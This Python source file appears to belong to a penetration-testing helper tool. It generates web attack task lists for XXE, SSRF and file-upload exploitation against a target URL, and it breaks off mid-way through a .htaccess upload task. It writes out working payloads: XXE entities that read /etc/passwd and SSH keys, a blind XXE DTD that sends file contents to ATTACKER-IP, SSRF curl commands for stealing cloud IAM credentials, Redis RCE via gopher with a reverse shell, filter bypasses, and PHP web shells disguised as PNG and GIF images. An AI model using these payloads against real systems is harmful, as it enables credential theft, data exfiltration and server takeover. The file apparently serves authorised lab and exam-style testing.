"""
Web Security Vulnerabilities plugin

Generates tasks for testing web application security vulnerabilities including:
- XXE (XML External Entity) injection
- SSRF (Server-Side Request Forgery)
- File Upload exploitation
- CORS misconfiguration testing
- WAF & Proxy bypass techniques
- Hop-by-hop header abuse

Extracted from HackTricks:
- pentesting-web/xxe-xee-xml-external-entity.md
- pentesting-web/ssrf-server-side-request-forgery/README.md
- pentesting-web/file-upload/README.md
- pentesting-web/cors-bypass.md
- pentesting-web/proxy-waf-protections-bypass.md
- pentesting-web/abusing-hop-by-hop-headers.md

Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class WebSecurityPlugin(ServicePlugin):
    """Web security vulnerabilities testing plugin"""

    @property
    def name(self) -> str:
        return "web-security"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443, 8000, 8888]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'http-alt', 'https-alt', 'ssl/http']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect HTTP/HTTPS services for web security testing"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common web ports
        if port in self.default_ports:
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate web security testing task tree"""

        is_https = port in [443, 8443] or 'https' in service_info.get('service', '').lower()
        protocol = 'https' if is_https else 'http'
        base_url = f'{protocol}://{target}:{port}'

        tasks = {
            'id': f'web-security-{port}',
            'name': f'Web Security Testing (Port {port})',
            'type': 'parent',
            'children': []
        }

        # SECTION 1: XXE (XML External Entity) Testing
        xxe_tasks = self._create_xxe_tasks(base_url, port)
        tasks['children'].append(xxe_tasks)

        # SECTION 2: SSRF (Server-Side Request Forgery) Testing
        ssrf_tasks = self._create_ssrf_tasks(base_url, port)
        tasks['children'].append(ssrf_tasks)

        # SECTION 3: File Upload Exploitation
        upload_tasks = self._create_file_upload_tasks(base_url, port)
        tasks['children'].append(upload_tasks)

        # SECTION 4: CORS Misconfiguration Testing
        cors_tasks = self._create_cors_tasks(base_url, port)
        tasks['children'].append(cors_tasks)

        # SECTION 5: WAF & Proxy Bypass Techniques
        waf_proxy_tasks = self._create_waf_proxy_bypass_tasks(base_url, port)
        tasks['children'].append(waf_proxy_tasks)

        return tasks

    def _create_xxe_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create XXE testing tasks"""
        return {
            'id': f'xxe-testing-{port}',
            'name': 'XXE (XML External Entity) Testing',
            'type': 'parent',
            'children': [
                # Task 1: Basic XXE Detection
                {
                    'id': f'xxe-basic-{port}',
                    'name': 'Basic XXE Detection (Entity Declaration)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Test if XML parser allows custom entity declarations',
                        'command': f'# Intercept XML request with Burp and inject:\n# <?xml version="1.0" encoding="UTF-8"?>\n# <!DOCTYPE foo [<!ENTITY toreplace "3"> ]>\n# <stockCheck><productId>&toreplace;</productId></stockCheck>',
                        'flag_explanations': {
                            '<!DOCTYPE foo': 'Declare Document Type Definition',
                            '<!ENTITY toreplace "3">': 'Define custom entity with value',
                            '&toreplace;': 'Reference entity (should expand to "3")'
                        },
                        'success_indicators': [
                            'Response contains "3" where entity was referenced',
                            'No XML parsing error returned',
                            'Entity successfully expanded in response'
                        ],
                        'failure_indicators': [
                            'XML parsing error',
                            'Entity not expanded (literal &toreplace; appears)',
                            'Request blocked by WAF'
                        ],
                        'next_steps': [
                            'If successful, test file read via XXE',
                            'Try SYSTEM entity for external resources',
                            'Test parameter entities for blind XXE'
                        ],
                        'alternatives': [
                            'Manual: Use Burp Repeater to modify POST body',
                            'Manual: Change Content-Type from JSON to application/xml',
                            'Tool: xxexploiter - automated XXE exploitation'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'QUICK_WIN'],
                        'notes': 'Find XML endpoints first: API calls, file uploads (DOCX, SVG), SOAP services. Portswigger Web Security Academy has free XXE labs: https://portswigger.net/web-security/xxe'
                    }
                },

                # Task 2: XXE File Read
                {
                    'id': f'xxe-file-read-{port}',
                    'name': 'XXE Local File Read',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit XXE to read local files (/etc/passwd, C:\\windows\\system32\\drivers\\etc\\hosts)',
                        'command': f'# Inject via Burp:\n# <?xml version="1.0" encoding="UTF-8"?>\n# <!DOCTYPE foo [<!ENTITY example SYSTEM "file:///etc/passwd"> ]>\n# <data>&example;</data>',
                        'flag_explanations': {
                            'SYSTEM "file:///etc/passwd"': 'External entity using file protocol to read local file',
                            '&example;': 'Entity reference triggers file read and includes content in response',
                            'php://filter/convert.base64-encode/resource=/etc/passwd': 'PHP wrapper for base64-encoded file read (bypasses binary/special chars)'
                        },
                        'success_indicators': [
                            'File contents visible in HTTP response',
                            '/etc/passwd contents (root:x:0:0...)',
                            'Windows hosts file contents'
                        ],
                        'failure_indicators': [
                            'File not found error',
                            'Entity expansion blocked by parser',
                            'Response empty or unchanged'
                        ],
                        'next_steps': [
                            'Read application config files (config.php, web.config)',
                            'Read SSH keys (~/.ssh/id_rsa)',
                            'Enumerate system for DTD files (for error-based XXE)',
                            'Try OOB exfiltration if no direct output'
                        ],
                        'alternatives': [
                            'Windows: file:///C:/windows/system32/drivers/etc/hosts',
                            'PHP wrapper: php://filter/convert.base64-encode/resource=/etc/passwd',
                            'Java directory listing: file:///etc/ (Java parsers only)',
                            'Error-based XXE if response not shown directly'
                        ],
                        'tags': ['OSCP:HIGH', 'MANUAL', 'FILE_READ'],
                        'notes': 'For multi-line files with special chars, use php://filter base64 encoding or OOB exfiltration. Java parsers can list directories with file:///path/'
                    }
                },

                # Task 3: XXE SSRF (Internal Network Scanning)
                {
                    'id': f'xxe-ssrf-{port}',
                    'name': 'XXE to SSRF (Internal Network Probe)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Abuse XXE to perform SSRF - access cloud metadata, internal services, localhost',
                        'command': f'# AWS metadata via XXE:\n# <!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>\n# <stockCheck><productId>&xxe;</productId></stockCheck>',
                        'flag_explanations': {
                            'http://169.254.169.254': 'AWS metadata service (cloud SSRF target)',
                            '/latest/meta-data/iam/security-credentials/': 'AWS IAM credentials endpoint',
                            'SYSTEM "http://127.0.0.1:8080"': 'Internal service probe (localhost port scan)'
                        },
                        'success_indicators': [
                            'Cloud metadata returned in response',
                            'AWS credentials visible (AccessKeyId, SecretAccessKey)',
                            'Internal service banner/response',
                            'Port scan reveals open ports'
                        ],
                        'failure_indicators': [
                            'Connection timeout',
                            'External HTTP requests blocked',
                            'No response from metadata endpoint'
                        ],
                        'next_steps': [
                            'Enumerate AWS metadata: /latest/meta-data/hostname',
                            'Scan internal network: http://192.168.1.x:8080',
                            'Access localhost services: http://127.0.0.1:6379 (Redis)',
                            'Exfiltrate via DNS if HTTP blocked'
                        ],
                        'alternatives': [
                            'Azure metadata: http://169.254.169.254/metadata/instance?api-version=2021-02-01',
                            'GCP metadata: http://metadata.google.internal/computeMetadata/v1/',
                            'Localhost aliases: http://127.0.0.1, http://[::1], http://0.0.0.0',
                            'Port scan: Iterate SYSTEM "http://target:PORT" for 1-65535'
                        ],
                        'tags': ['OSCP:MEDIUM', 'SSRF', 'CLOUD'],
                        'notes': 'Cloud metadata endpoints are OSCP goldmines. Try localhost:22 (SSH), :3306 (MySQL), :5432 (PostgreSQL), :6379 (Redis), :8080 (common alt-HTTP)'
                    }
                },

                # Task 4: Blind XXE (OOB Exfiltration)
                {
                    'id': f'xxe-blind-oob-{port}',
                    'name': 'Blind XXE (Out-of-Band Data Exfiltration)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exfiltrate file contents via DNS/HTTP when XXE response not directly visible',
                        'command': f'# 1. Host malicious DTD on your server (malicious.dtd):\n# <!ENTITY % file SYSTEM "file:///etc/hostname">\n# <!ENTITY % eval "<!ENTITY % exfiltrate SYSTEM \'http://ATTACKER-IP/?x=%file;\'>">\n# %eval;\n# %exfiltrate;\n\n# 2. Trigger XXE with external DTD:\n# <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://ATTACKER-IP/malicious.dtd"> %xxe;]>\n# <stockCheck><productId>test</productId></stockCheck>',
                        'flag_explanations': {
                            '% file': 'Parameter entity reading local file',
                            '% eval': 'Parameter entity dynamically creating exfiltration entity',
                            '% exfiltrate': 'Triggers HTTP request with file content in URL',
                            'SYSTEM "http://ATTACKER-IP/malicious.dtd"': 'External DTD loaded from attacker server'
                        },
                        'success_indicators': [
                            'HTTP request received on attacker server',
                            'File contents visible in HTTP request query string',
                            'DNS lookup for attacker domain',
                            'Base64-encoded file data in request'
                        ],
                        'failure_indicators': [
                            'No outbound connection to attacker server',
                            'External DTD blocked',
                            'Parameter entities disabled',
                            'Firewall blocking outbound HTTP/DNS'
                        ],
                        'next_steps': [
                            'Try FTP exfil for multi-line files: ftp://attacker-ip/%file;',
                            'Use DNS exfil if HTTP blocked: attacker-controlled-domain.com',
                            'Error-based XXE if OOB blocked (local DTD hijacking)',
                            'Automate with xxexploiter tool'
                        ],
                        'alternatives': [
                            'Manual: python3 -m http.server 80 (host malicious.dtd)',
                            'Burp Collaborator for OOB detection',
                            'Interactsh: curl -X POST https://interact.sh',
                            'FTP exfil: xxe-ftp-server.rb from ONsec-Lab/scripts',
                            'DNS exfil: Encode file in subdomain lookups'
                        ],
                        'tags': ['OSCP:MEDIUM', 'OOB', 'BLIND'],
                        'notes': 'For exam: use tun0 IP as ATTACKER-IP. FTP works better for multi-line files. Test with simple HTTP callback first before complex exfil. Many firewalls block outbound, fallback to error-based XXE.'
                    }
                },

                # Task 5: XXE via SVG Upload
                {
                    'id': f'xxe-svg-upload-{port}',
                    'name': 'XXE via SVG File Upload',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit XML parsers via SVG image upload (file read, SSRF)',
                        'command': f'# Create malicious SVG:\n# <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" height="200">\n#   <image xlink:href="file:///etc/hostname"></image>\n# </svg>\n\n# Upload SVG to image upload form, then access uploaded image URL',
                        'flag_explanations': {
                            'xmlns:xlink': 'XLink namespace for external resource references',
                            'xlink:href="file:///etc/hostname"': 'SVG external reference to local file',
                            'expect://ls': 'PHP expect wrapper for command execution (rare)'
                        },
                        'success_indicators': [
                            'File contents rendered inside SVG image',
                            'View image source shows file data',
                            'Command output visible in image (expect://)',
                            'SSRF callback received'
                        ],
                        'failure_indicators': [
                            'SVG upload rejected (file type validation)',
                            'Image not processed/rendered',
                            'External entities disabled in XML parser',
                            'Uploaded file sanitized/stripped'
                        ],
                        'next_steps': [
                            'Read /etc/passwd via file:///etc/passwd',
                            'Try PHP expect wrapper: expect://id',
                            'SSRF to cloud metadata via http://169.254.169.254',
                            'Test DOCX upload (Office documents are XML-based)'
                        ],
                        'alternatives': [
                            'DOCX upload: Unzip, edit word/document.xml, re-zip',
                            'PDF upload: https://github.com/ONsec-Lab/xxe-lab (PDF XXE)',
                            'Manual: Convert legitimate image to SVG+XXE payload',
                            'Manual: Test all file upload forms (profile pic, document upload, CSV import)'
                        ],
                        'tags': ['OSCP:HIGH', 'FILE_UPLOAD', 'QUICK_WIN'],
                        'estimated_time': '5-10 minutes',
                        'notes': 'OSCP boxes often have image upload forms. SVG is XML, so parsers may be vulnerable. First line of file/command appears in image - view image source or download. PHP expect module rarely enabled.'
                    }
                },

                # Task 6: Error-Based XXE (System DTD)
                {
                    'id': f'xxe-error-based-{port}',
                    'name': 'Error-Based XXE (System DTD Hijacking)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit XXE when OOB blocked - hijack local DTD to leak data via error messages',
                        'command': f'# GNOME systems (common on Linux):\n# <!DOCTYPE foo [\n#   <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">\n#   <!ENTITY % ISOamso \'\n#     <!ENTITY % file SYSTEM "file:///etc/passwd">\n#     <!ENTITY % eval "<!ENTITY % error SYSTEM \'file:///nonexistent/%file;\'>">\n#     %eval;\n#     %error;\n#   \'>\n#   %local_dtd;\n# ]>\n# <stockCheck><productId>3</productId></stockCheck>',
                        'flag_explanations': {
                            'file:///usr/share/yelp/dtd/docbookx.dtd': 'Common DTD on GNOME Linux systems',
                            '%ISOamso': 'Redefine entity from system DTD',
                            'file:///nonexistent/%file;': 'Trigger error with file contents in path',
                            '%local_dtd;': 'Load system DTD, trigger redefined entity'
                        },
                        'success_indicators': [
                            'Error message contains file contents',
                            'File path with data in error: /nonexistent/root:x:0:0...',
                            'XML parser error exposes sensitive data'
                        ],
                        'failure_indicators': [
                            'No error message returned',
                            'Errors not displayed to user',
                            'DTD file not found on system',
                            'Entity redefinition blocked'
                        ],
                        'next_steps': [
                            'Find DTD files: https://github.com/GoSecure/dtd-finder',
                            'Enumerate system DTDs (try multiple paths)',
                            'Parse error messages for leaked data',
                            'Fallback to blind XXE if errors suppressed'
                        ],
                        'alternatives': [
                            'Common DTD paths: /usr/share/xml/, /usr/local/app/schema.dtd',
                            'Windows DTDs: C:\\Windows\\System32\\...',
                            'Docker image scanning: dtd-finder-1.2-SNAPSHOT-all.jar',
                            'Manual: Test 10-20 common DTD paths from dtd-finder repo'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ADVANCED', 'ERROR_BASED'],
                        'notes': 'Use when outbound connections blocked. Requires: 1) Error messages visible, 2) DTD file exists on system. DTD-finder has lists of system DTDs. Time-consuming but works offline.'
                    }
                }
            ]
        }

    def _create_ssrf_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create SSRF testing tasks"""
        return {
            'id': f'ssrf-testing-{port}',
            'name': 'SSRF (Server-Side Request Forgery) Testing',
            'type': 'parent',
            'children': [
                # Task 1: Basic SSRF Detection
                {
                    'id': f'ssrf-basic-{port}',
                    'name': 'Basic SSRF Detection (OOB Callback)',
                    'type': 'command',
                    'metadata': {
                        'description': 'Test URL parameters for SSRF by triggering HTTP/DNS callback',
                        'command': f'# Find URL parameter (url=, path=, target=, etc.) and test:\ncurl "{base_url}/?url=http://BURP-COLLABORATOR.burpcollaborator.net"\n\n# Monitor for callback: Burp Collaborator, Interactsh, webhook.site',
                        'flag_explanations': {
                            'url=': 'Common SSRF parameter (also: path=, target=, dest=, redirect=, uri=)',
                            'http://BURP-COLLABORATOR': 'OOB detection endpoint (DNS + HTTP)',
                            'Interactsh': 'Free alternative to Burp Collaborator'
                        },
                        'success_indicators': [
                            'HTTP request received on Burp Collaborator',
                            'DNS lookup for your domain',
                            'Server User-Agent in callback headers',
                            'Server IP revealed in callback'
                        ],
                        'failure_indicators': [
                            'No callback received',
                            'URL validation blocking external domains',
                            'Firewall blocking outbound connections',
                            'Request timeout'
                        ],
                        'next_steps': [
                            'If blocked, try localhost: http://127.0.0.1:80',
                            'Cloud metadata: http://169.254.169.254/latest/meta-data/',
                            'Internal network scan: http://192.168.1.x',
                            'Protocol smuggling: file://, gopher://, dict://'
                        ],
                        'alternatives': [
                            'Burp Collaborator: Burp → Collaborator tab → Generate',
                            'Interactsh: curl -X POST https://interact.sh',
                            'Webhook.site: https://webhook.site (HTTP only)',
                            'Manual DNS: nslookup YOUR-DOMAIN (check logs)',
                            'Manual HTTP: python3 -m http.server 80'
                        ],
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'OOB'],
                        'estimated_time': '2-5 minutes',
                        'notes': 'SSRF params often in: URL shorteners, webhooks, image fetch, PDF generators, proxy features. Test GET params, POST body (JSON/XML), HTTP headers (Referer, X-Forwarded-For)'
                    }
                },

                # Task 2: SSRF to Cloud Metadata
                {
                    'id': f'ssrf-cloud-metadata-{port}',
                    'name': 'SSRF to Cloud Metadata (AWS/Azure/GCP)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit SSRF to access cloud provider metadata services (IAM credentials, instance data)',
                        'command': f'# AWS metadata:\ncurl "{base_url}/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"\n\n# Azure metadata (requires header):\ncurl "{base_url}/?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01" -H "Metadata:true"\n\n# GCP metadata:\ncurl "{base_url}/?url=http://metadata.google.internal/computeMetadata/v1/instance/"',
                        'flag_explanations': {
                            '169.254.169.254': 'Cloud metadata IP (link-local, non-routable)',
                            '/latest/meta-data/': 'AWS metadata endpoint',
                            '/iam/security-credentials/': 'AWS IAM role credentials',
                            'Metadata:true': 'Azure requires this header for metadata access'
                        },
                        'success_indicators': [
                            'IAM credentials returned (AccessKeyId, SecretAccessKey)',
                            'Instance metadata (hostname, region, tags)',
                            'AWS role name listed',
                            'Cloud provider confirmed via metadata response'
                        ],
                        'failure_indicators': [
                            'Metadata endpoint unreachable (not cloud)',
                            'URL validation blocking 169.254.x.x',
                            'Request timeout',
                            'Metadata service disabled'
                        ],
                        'next_steps': [
                            'Extract IAM credentials and test with AWS CLI',
                            'Enumerate metadata: /latest/meta-data/hostname',
                            'User-data scripts: /latest/user-data',
                            'Azure managed identity token: /metadata/identity/oauth2/token',
                            'GCP service account: /computeMetadata/v1/instance/service-accounts/'
                        ],
                        'alternatives': [
                            'AWS IMDSv2 (requires token): curl -X PUT http://169.254.169.254/latest/api/token',
                            'Azure: http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01',
                            'GCP: http://metadata.google.internal/computeMetadata/v1/?recursive=true',
                            'Bypass filters: http://[::ffff:169.254.169.254], http://0xA9FEA9FE (hex)',
                            'DNS rebinding if IP blocked: Create domain resolving to 169.254.169.254'
                        ],
                        'tags': ['OSCP:HIGH', 'CLOUD', 'SSRF'],
                        'notes': 'Cloud metadata is OSCP exam win condition. AWS IMDSv2 requires token (PUT request first). Azure needs Metadata:true header. GCP uses metadata.google.internal hostname.'
                    }
                },

                # Task 3: SSRF Localhost Port Scan
                {
                    'id': f'ssrf-localhost-scan-{port}',
                    'name': 'SSRF Internal Port Scan (Localhost Services)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Use SSRF to scan localhost for internal services (databases, Redis, admin panels)',
                        'command': f'# Scan common ports:\nfor port in 22 80 3306 5432 6379 8080 27017; do\n  echo "Testing localhost:$port"\n  curl "{base_url}/?url=http://127.0.0.1:$port"\ndone\n\n# Check response time/size for open vs closed',
                        'flag_explanations': {
                            'http://127.0.0.1': 'Localhost (also try: http://0, http://[::1], http://0.0.0.0)',
                            ':3306': 'MySQL default port',
                            ':5432': 'PostgreSQL',
                            ':6379': 'Redis',
                            ':27017': 'MongoDB'
                        },
                        'success_indicators': [
                            'Service banner in response (SSH-2.0, HTTP/1.1)',
                            'Database error message',
                            'Redis +PONG response',
                            'Response size/time differs for open ports'
                        ],
                        'failure_indicators': [
                            'Connection refused (port closed)',
                            'Timeout on all ports (localhost blocked)',
                            'No response differences',
                            'SSRF filter blocking localhost'
                        ],
                        'next_steps': [
                            'Interact with Redis: gopher://127.0.0.1:6379/_%2A1%0D%0A...',
                            'MySQL SSRF: gopher:// payload for auth bypass',
                            'Admin panels: http://127.0.0.1:8080/admin',
                            'Docker API: http://127.0.0.1:2375/containers/json',
                            'Kubernetes: http://127.0.0.1:10250/pods'
                        ],
                        'alternatives': [
                            'Localhost aliases: http://0, http://0.0.0.0, http://[::1]',
                            'Bypass filters: http://127.1, http://0177.0.0.1 (octal)',
                            'CIDR bypass: http://127.0.0.1.nip.io',
                            'URL encoding: http://127.0.0.%31 (decimal)',
                            'Manual: Burp Intruder with port list 1-65535'
                        ],
                        'tags': ['OSCP:MEDIUM', 'PORT_SCAN', 'INTERNAL'],
                        'notes': 'Common OSCP internal ports: 22 (SSH), 3306 (MySQL), 5432 (PostgreSQL), 6379 (Redis), 8080/8000 (alt HTTP), 27017 (MongoDB). Use response timing for blind port scan.'
                    }
                },

                # Task 4: Gopher Protocol Exploitation
                {
                    'id': f'ssrf-gopher-{port}',
                    'name': 'Gopher Protocol SSRF (Redis/SMTP/HTTP)',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Abuse gopher:// protocol to interact with internal TCP services (Redis RCE, SMTP relay)',
                        'command': f'# Redis RCE via gopher (use Gopherus tool):\n# 1. Generate payload:\npython3 gopherus.py --exploit redis\n# 2. Enter reverse shell command\n# 3. URL-encode output and inject:\ncurl "{base_url}/?url=gopher://127.0.0.1:6379/_PAYLOAD"\n\n# SMTP relay:\ncurl "{base_url}/?url=gopher://127.0.0.1:25/_HELO%20localhost%0AMAIL%20FROM..."',
                        'flag_explanations': {
                            'gopher://': 'Protocol allowing raw TCP data send',
                            'gopherus.py': 'Tool generating gopher payloads for Redis, MySQL, SMTP, etc.',
                            '_PAYLOAD': 'Gopher payload (URL-encoded)',
                            '%0A': 'Newline in gopher (%0D%0A for CRLF)'
                        },
                        'success_indicators': [
                            'Redis RCE: Reverse shell received',
                            'SMTP: Email sent via relay',
                            'MySQL: Authenticated to database',
                            'Service responds to gopher commands'
                        ],
                        'failure_indicators': [
                            'Gopher protocol blocked/unsupported',
                            'Connection refused to internal service',
                            'Payload format incorrect',
                            'URL encoding issues'
                        ],
                        'next_steps': [
                            'Redis RCE: Write cron job, SSH key, or web shell',
                            'MySQL: Read files with LOAD DATA INFILE',
                            'SMTP: Phishing emails via internal relay',
                            'FastCGI: RCE via gopher + PHP-FPM',
                            'Java RMI: remote-method-guesser gopher payloads'
                        ],
                        'alternatives': [
                            'Gopherus: git clone https://github.com/tarunkant/Gopherus.git',
                            'Manual Redis: gopher://127.0.0.1:6379/_%2A1%0D%0A%244%0D%0Ainfo%0D%0A',
                            'Dict protocol: dict://127.0.0.1:11211/stats (memcached)',
                            'SFTP: sftp://target:11111/ (PHP specific)',
                            'TFTP: tftp://target:12346/file (UDP, rare)'
                        ],
                        'tags': ['OSCP:MEDIUM', 'ADVANCED', 'RCE'],
                        'notes': 'Gopherus generates payloads for Redis, MySQL, SMTP, FastCGI, Memcached. Gopher requires URL-encode. Not all clients support gopher (curl does, browsers often block). FastCGI + gopher = PHP RCE.'
                    }
                },

                # Task 5: SSRF Filter Bypass
                {
                    'id': f'ssrf-bypass-{port}',
                    'name': 'SSRF Filter Bypass Techniques',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass SSRF protections: whitelist, blacklist, DNS tricks',
                        'command': f'# Localhost bypass techniques:\ncurl "{base_url}/?url=http://127.1"           # Short form\ncurl "{base_url}/?url=http://0"              # Decimal zero\ncurl "{base_url}/?url=http://[::1]"          # IPv6\ncurl "{base_url}/?url=http://0177.0.0.1"     # Octal\ncurl "{base_url}/?url=http://2130706433"     # Decimal IP\ncurl "{base_url}/?url=http://0x7f.0x0.0x0.0x1"  # Hex',
                        'flag_explanations': {
                            'http://127.1': 'Short form of 127.0.0.1',
                            'http://[::1]': 'IPv6 localhost',
                            'http://0177.0.0.1': 'Octal IP notation',
                            'http://2130706433': 'Decimal representation of 127.0.0.1',
                            'http://0.0.0.0': 'Bypass local network pre-flight checks'
                        },
                        'success_indicators': [
                            'Blacklist bypassed (localhost reached)',
                            'Internal network accessible',
                            'Cloud metadata retrieved',
                            'Response from filtered IP'
                        ],
                        'failure_indicators': [
                            'All bypass attempts blocked',
                            'DNS resolution filtered',
                            'IP normalization before check',
                            'WAF blocking variations'
                        ],
                        'next_steps': [
                            'Try DNS rebinding attack',
                            'Open redirect chaining (bypass whitelist)',
                            'URL parsing confusion (@, #, ?, \\)',
                            'CRLF injection in URL',
                            'Unicode normalization bypass'
                        ],
                        'alternatives': [
                            'DNS tricks: 127.0.0.1.nip.io resolves to 127.0.0.1',
                            'Whitelist bypass: http://allowed-domain@evil.com',
                            'Open redirect: http://allowed-domain/redirect?url=http://evil',
                            'CRLF injection: http://foo%0d%0aHost:%20127.0.0.1',
                            'URL parsing: http://foo@127.0.0.1:80@evil.com',
                            'IPv6: http://[::ffff:169.254.169.254] (IPv4-mapped)'
                        ],
                        'tags': ['OSCP:MEDIUM', 'BYPASS', 'ADVANCED'],
                        'notes': 'URL parsing differences between validator and requester = bypass. Test parser confusion: @, #, \\, ?, %. Many filters normalize before check. DNS rebinding = advanced (race condition).'
                    }
                }
            ]
        }

    def _create_file_upload_tasks(self, base_url: str, port: int) -> Dict[str, Any]:
        """Create file upload exploitation tasks"""
        return {
            'id': f'file-upload-{port}',
            'name': 'File Upload Exploitation',
            'type': 'parent',
            'children': [
                # Task 1: Extension Bypass
                {
                    'id': f'upload-extension-bypass-{port}',
                    'name': 'File Extension Bypass Techniques',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass file extension validation to upload web shells',
                        'command': f'# Test extension bypass (create shell.php variations):\n# 1. Double extension: shell.php.png\n# 2. Null byte: shell.php%00.png\n# 3. Case variation: shell.pHp, shell.PhP\n# 4. Alternate extensions: shell.php5, shell.phtml, shell.phar\n# 5. Special chars: shell.php%20, shell.php., shell.php....\n# 6. NTFS ADS: shell.asp::$data',
                        'flag_explanations': {
                            '.php.png': 'Double extension (parser confusion)',
                            '.php%00.png': 'Null byte injection (PHP < 5.3.4)',
                            '.pHp': 'Case bypass (if case-sensitive check)',
                            '.php5, .phtml, .phar': 'Alternative PHP extensions',
                            '.php%20': 'Trailing space (trimmed on save)',
                            '::$data': 'NTFS Alternate Data Stream (Windows)'
                        },
                        'success_indicators': [
                            'Shell uploaded and executable',
                            'PHP code executes at uploaded path',
                            'File extension bypass successful',
                            'Web shell accessible: /uploads/shell.php'
                        ],
                        'failure_indicators': [
                            'Extension rejected',
                            'File renamed/sanitized on server',
                            'Upload folder not web-accessible',
                            'File executed as text (not code)'
                        ],
                        'next_steps': [
                            'Find uploaded file path (guess, error messages, directory listing)',
                            'Test for LFI to execute uploaded file',
                            'Combine with path traversal: ../../../var/www/shell.php',
                            'Upload .htaccess to make .png execute as PHP',
                            'Race condition: Upload + request before virus scan'
                        ],
                        'alternatives': [
                            'ASP: .asp, .aspx, .config, .ashx, .cer',
                            'JSP: .jsp, .jspx, .jsw, .jsv',
                            'PHP: .php, .php3, .php4, .php5, .phtml, .inc',
                            'Perl: .pl, .cgi',
                            'Manual: Burp Intruder fuzzing extension list',
                            'Filename overflow: 255 chars → AAA...AAA.php.png (truncates to .php)'
                        ],
                        'tags': ['OSCP:HIGH', 'FILE_UPLOAD', 'WEB_SHELL'],
                        'estimated_time': '10-15 minutes',
                        'notes': 'Apache misconfiguration: anything with .php executes (even .php.png). Test all extensions from SecLists/Web-Shells/extensions_php.txt. Null byte only works on old PHP.'
                    }
                },

                # Task 2: Magic Bytes/Content-Type Bypass
                {
                    'id': f'upload-magic-bytes-{port}',
                    'name': 'Magic Bytes & Content-Type Bypass',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Bypass file type validation using magic bytes and Content-Type manipulation',
                        'command': f'# Create polyglot web shell (valid image + PHP code):\nprintf "\\x89PNG\\r\\n\\x1a\\n" > shell.php\ncat >> shell.php <<EOF\n<?php system($_GET["cmd"]); ?>\nEOF\n\n# Upload with Content-Type spoofing:\ncurl -X POST {base_url}/upload -F "file=@shell.php;type=image/png"',
                        'flag_explanations': {
                            '\\x89PNG\\r\\n\\x1a\\n': 'PNG magic bytes (file command bypass)',
                            'type=image/png': 'Content-Type header (MIME type)',
                            'exiftool -Comment="<?php..."': 'Inject PHP in image metadata',
                            'PLTE/IDAT/tEXt chunk': 'PNG chunks surviving compression'
                        },
                        'success_indicators': [
                            'File passes magic byte validation',
                            'Image displays with embedded code',
                            'Code executes when file accessed',
                            'Metadata preserved after upload'
                        ],
                        'failure_indicators': [
                            'Magic bytes validated AND extension checked',
                            'Image re-encoded/compressed (payload lost)',
                            'Metadata stripped on upload',
                            'File not executable (wrong extension)'
                        ],
                        'next_steps': [
                            'Use LFI to execute uploaded .png: /page.php?file=../../uploads/shell.png',
                            'Upload .htaccess: AddType application/x-httpd-php .png',
                            'GIF polyglot: GIF89a<?php system($_GET["cmd"]); ?>',
                            'Exiftool metadata injection',
                            'Test compression-resistant payloads (PLTE chunk)'
                        ],
                        'alternatives': [
                            'Manual: echo "GIF89a" > shell.php.gif; cat code.php >> shell.php.gif',
                            'Exiftool: exiftool -Comment="<?php echo shell_exec($_GET[\'cmd\']); ?>" img.jpg',
                            'PLTE chunk: https://github.com/synacktiv/astrolock/gen_plte_png.php',
                            'IDAT chunk (survives resize): gen_idat_png.php',
                            'SecLists: /usr/share/seclists/Web-Shells/FuzzDB/nc.gif.php.txt'
                        ],
                        'tags': ['OSCP:HIGH', 'POLYGLOT', 'BYPASS'],
                        'notes': 'Polyglot = valid image + working code. Requires LFI or .htaccess to execute. PHP-GD image compression destroys most payloads - use PLTE/IDAT chunks. GIF format most permissive.'
                    }
                },

                # Task 3: .htaccess Upload
                {
                    'id': f'upload-htaccess-{port}',
                    'name': 'Upload .htaccess for Code Execution',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Upload .htaccess to make non-executable files (PNG, TXT) execute as PHP',
                        'command': f'# Create malicious .htaccess:\ncat > .htaccess <<EOF\nAddType application/x-httpd-php .png\nEOF\n\n# 1. Upload .htaccess to /uploads/\n# 2. Upload shell.png (containing PHP code)\n# 3. Access: {base_url}/uploads/shell.png',
                        'flag_explanations': {
                            'AddType application/x-httpd-php .png': 'Treat .png files as PHP',
                            'AddHandler application/x-httpd-php .png': 'Alternative directive',
                            'SetHandler application/x-httpd-php': 'Handle all files as PHP',
                            '.htaccess': 'Apache per-directory config (if AllowOverride enabled)'
                        },
                        'success_indicators': [
                            '.htaccess uploaded successfully',
                            'PNG files now execute as PHP',
                            'Web shell accessible and functional',
                            'Code execution confirmed'
                        ],
